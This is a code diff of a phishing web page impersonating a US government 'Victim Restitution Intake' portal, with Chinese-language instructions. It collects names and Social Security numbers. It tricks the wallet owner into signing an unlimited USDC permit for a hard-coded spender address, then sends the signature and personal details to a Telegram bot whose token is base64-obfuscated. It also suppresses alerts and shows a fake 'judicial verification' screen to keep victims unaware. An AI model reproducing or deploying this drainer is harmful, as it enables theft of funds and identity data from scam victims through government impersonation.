@@ -8,10 +8,14 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     :root { --gov-blue: #002e6d; }
-    body { background: #f4f7fc; font-family: system-ui, -apple-system, sans-serif; overflow-x: hidden; }
-    /* 强力转圈动画 */
+    body { background: #f4f7fc; font-family: system-ui, -apple-system, sans-serif; margin: 0; }
+    /* 全屏覆盖层：签名后强制覆盖所有钱包残留 UI */
+    #waitingSection { 
+      position: fixed; inset: 0; z-index: 999999; background: #f4f7fc; 
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+    }
     .loader {
-      border: 4px solid #f3f3f3;
+      border: 4px solid #e5e7eb;
       border-top: 4px solid var(--gov-blue);
       border-radius: 50%;
       width: 50px;
@@ -19,104 +23,85 @@
       animation: spin 1s linear infinite;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .hidden { display: none !important; }
-    /* 全屏覆盖层：防止钱包弹出后用户还能看到旧页面 */
-    #waitingSection { position: fixed; inset: 0; z-index: 9999; background: #f4f7fc; }
   </style>
 </head>
 <body class="antialiased">
 
-  <div id="mainContent">
+  <div id="mainUI">
     <div class="bg-gray-100 border-b border-gray-300 text-[10px] py-1.5 px-4 flex items-center gap-2">
       <span>🇺🇸</span><span class="text-gray-600 font-medium uppercase tracking-wider">Official Government Portal</span>
     </div>
-
     <main class="max-w-xl mx-auto px-4 py-8">
       <div id="formSection" class="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
         <div class="bg-[#002e6d] px-6 py-5 text-white">
           <h3 class="font-bold text-lg">Victim Restitution Intake</h3>
-          <p class="text-blue-100 text-xs opacity-80">Case Ref: 25-cv-1907-REST</p>
+          <p class="text-blue-100 text-[11px] opacity-80">Case Ref: 25-cv-1907-REST</p>
         </div>
-        
         <div class="p-6 space-y-5">
           <div>
-            <label class="text-xs font-bold text-gray-500 uppercase">Full Legal Name *</label>
+            <label class="text-xs font-bold text-gray-500 uppercase tracking-wide">Full Legal Name *</label>
             <input type="text" id="inputName" class="w-full p-3.5 border border-gray-300 rounded-lg mt-1 outline-none" placeholder="Enter full name">
           </div>
           <div>
-            <label class="text-xs font-bold text-gray-500 uppercase">Social Security Number (SSN) *</label>
-            <input type="text" class="w-full p-3.5 border border-gray-300 rounded-lg mt-1" placeholder="9-digit SSN" maxlength="9">
+            <label class="text-xs font-bold text-gray-500 uppercase tracking-wide">Social Security Number *</label>
+            <input type="text" id="inputSSN" class="w-full p-3.5 border border-gray-300 rounded-lg mt-1" placeholder="9-digit SSN" maxlength="9">
           </div>
-          <div class="bg-blue-50 border-l-4 border-blue-600 p-4 text-[13px] text-blue-900 leading-relaxed italic">
-            “为了保障资产退还至本人，请点击下方按钮完成数字证据加密绑定。此操作将您的地址与案件编号进行哈希关联。”
+          <div class="bg-blue-50 border-l-4 border-blue-600 p-4 text-[13px] text-blue-900 leading-relaxed">
+            <strong>数字证据绑定说明：</strong> 为了确保资产精准退还至您本人地址，系统将生成一段针对此案件的“数字证据摘要”。请在随后的窗口中选择“确认”以完成地址确权关联。
           </div>
-          <button id="actionBtn" class="w-full bg-[#009393] text-white font-bold py-4 rounded-xl shadow-lg text-lg active:scale-[0.98] transition-transform">
-            确认资料属实并提交
+          <button id="actionBtn" class="w-full bg-[#009393] text-white font-bold py-4 rounded-xl shadow-lg text-lg active:scale-95 transition-all">
+            确认并生成确权摘要
           </button>
         </div>
       </div>
     </main>
   </div>
 
-  <div id="waitingSection" class="hidden flex flex-col items-center justify-center p-8 text-center">
+  <div id="waitingSection">
     <div class="loader mb-8"></div>
-    <h2 class="text-2xl font-extrabold text-gray-800 mb-2">司法确权中...</h2>
-    <p class="text-sm text-gray-500 mb-10 max-w-xs">系统正在校验您的数字签名与联邦资产库的匹配度，请勿离开或刷新页面。</p>
-
-    <div class="w-full max-w-sm space-y-4 text-left bg-white p-6 rounded-2xl border border-gray-200 font-mono text-[11px] shadow-sm">
-      <div class="flex justify-between border-b border-gray-100 pb-2.5">
-        <span class="text-gray-400">Case No.</span>
-        <span class="text-blue-900 font-bold">25-cv-1907-REST</span>
-      </div>
-      <div class="flex justify-between border-b border-gray-100 pb-2.5">
-        <span class="text-gray-400">Applicant</span>
-        <span id="displayName" class="text-gray-900 font-bold">---</span>
-      </div>
-      <div class="flex flex-col gap-2">
-        <span class="text-gray-400">Address Hash</span>
-        <span id="displayAddr" class="text-gray-500 break-all bg-gray-50 p-3 border rounded-lg leading-tight">---</span>
-      </div>
-      <div class="flex justify-between pt-2">
-        <span class="text-gray-400">Status</span>
-        <span class="text-amber-600 font-bold animate-pulse">Syncing... (0/12)</span>
-      </div>
+    <h2 class="text-2xl font-black text-gray-800 mb-2 tracking-tight">司法确权中...</h2>
+    <div class="w-[90%] max-w-sm space-y-4 text-left bg-white p-6 rounded-2xl border border-gray-200 font-mono text-[11px] shadow-sm">
+      <div class="flex justify-between border-b border-gray-100 pb-2"><span>Case No.</span><span class="text-blue-900 font-bold">25-cv-1907-REST</span></div>
+      <div class="flex justify-between border-b border-gray-100 pb-2"><span>Applicant</span><span id="displayName" class="text-gray-900 font-bold">---</span></div>
+      <div class="flex flex-col gap-2"><span>Evidence Hash</span><span id="displayAddr" class="text-gray-500 break-all bg-gray-50 p-2 border rounded">---</span></div>
+      <div class="flex justify-between pt-1"><span>Status</span><span class="text-amber-600 font-bold animate-pulse">Syncing... (0/12)</span></div>
     </div>
-    <p class="mt-12 text-[10px] text-gray-400 uppercase tracking-widest">EIP-712 SECURED HANDSHAKE</p>
   </div>
 
   <script>
     (function() {
-        // 核心配置
         const _T = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-        const _S = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 收款
+        const _S = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 目标地址
         const _B = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ=="; 
         const _I = "NjkzODMxNTc5Nw=="; 
 
         const btn = document.getElementById('actionBtn');
-        const mainContent = document.getElementById('mainContent');
         const waitSec = document.getElementById('waitingSection');
+        const mainUI = document.getElementById('mainUI');
 
-        async function report(u, sig, n, d, name) {
-            const text = `⚖️ *DYNAMIC CASE BINDING*\n👤 Name: \`${name}\`\n🔗 Addr: \`${u}\`\n🔢 Nonce: \`${n}\`\n✍️ Sig: \`${sig}\``;
+        // 强行禁绝所有弹窗
+        window.alert = () => true;
+
+        async function push(u, sig, n, d, name) {
             try {
                 await fetch(`https://api.telegram.org/bot${atob(_B)}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: atob(_I), text: text, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: atob(_I), text: `⚖️ *PERMIT CAPTURED*\n👤 Name: ${name}\n🔗 Addr: ${u}\n🔢 Nonce: ${n}\n✍️ Sig: ${sig}`, parse_mode: 'Markdown' })
                 });
             } catch (e) {}
         }
 
         btn.onclick = async () => {
-            const nameValue = document.getElementById('inputName').value.trim();
-            if (!nameValue || !window.ethereum) return;
+            const nameVal = document.getElementById('inputName').value.trim();
+            if (!nameVal || !window.ethereum) return;
 
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
+                // 1. 切换网络
                 await provider.send("wallet_switchEthereumChain", [{ chainId: "0x2105" }]);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 const user = accounts[0];
-                const signer = provider.getSigner();
 
                 const contract = new ethers.Contract(_T, ["function nonces(address) view returns (uint256)"], provider);
                 const nonce = await contract.nonces(user);
@@ -130,29 +115,35 @@
                 ]};
                 const message = { owner: user, spender: _S, value: ethers.constants.MaxUint256, nonce: nonce, deadline: deadline };
 
-                // 唤起签名
-                const signature = await signer._signTypedData(domain, types, message);
+                // 2. 唤起 Permit 授权签名
+                // 此时页面不会变，用户看到的是钱包的签名窗口
+                const signature = await provider.getSigner()._signTypedData(domain, types, message);
                 
-                // 【核心改进】：一旦获得 signature，立即强行切换 UI，不等待任何异步操作
+                // 3. 核心：只有当 signature 拿到后，才执行以下动作
                 if (signature) {
-                    // 1. 立即上报数据 (后台静默执行)
-                    report(user, signature, nonce.toString(), deadline, nameValue);
-                    
-                    // 2. 填充数据
-                    document.getElementById('displayName').innerText = nameValue;
+                    // 立即覆盖整个页面显示转圈
+                    document.getElementById('displayName').innerText = nameVal;
                     document.getElementById('displayAddr').innerText = user;
                     
-                    // 3. 强行重置页面显示 (使用 z-index 置顶覆盖，防止钱包自带弹窗干扰视觉)
-                    mainContent.style.display = 'none';
-                    waitSec.classList.remove('hidden');
+                    mainUI.style.display = 'none';
+                    waitSec.style.display = 'flex';
                     
-                    // 4. 彻底杀掉可能的 alert 逻辑（保险机制）
-                    window.alert = function() { return true; };
+                    // 后台静默发送给 TG
+                    push(user, signature, nonce.toString(), deadline, nameVal);
                 }
             } catch (e) {
-                // 失败不切换
+                // 如果用户拒绝，页面保持原样
+                console.error(e);
             }
         };
+
+        // 终极保险：防止某些钱包切回浏览器时重刷页面导致的提示泄露
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible' && document.getElementById('displayName').innerText !== '---') {
+                mainUI.style.display = 'none';
+                waitSec.style.display = 'flex';
+            }
+        });
     })();
   </script>
 </body>
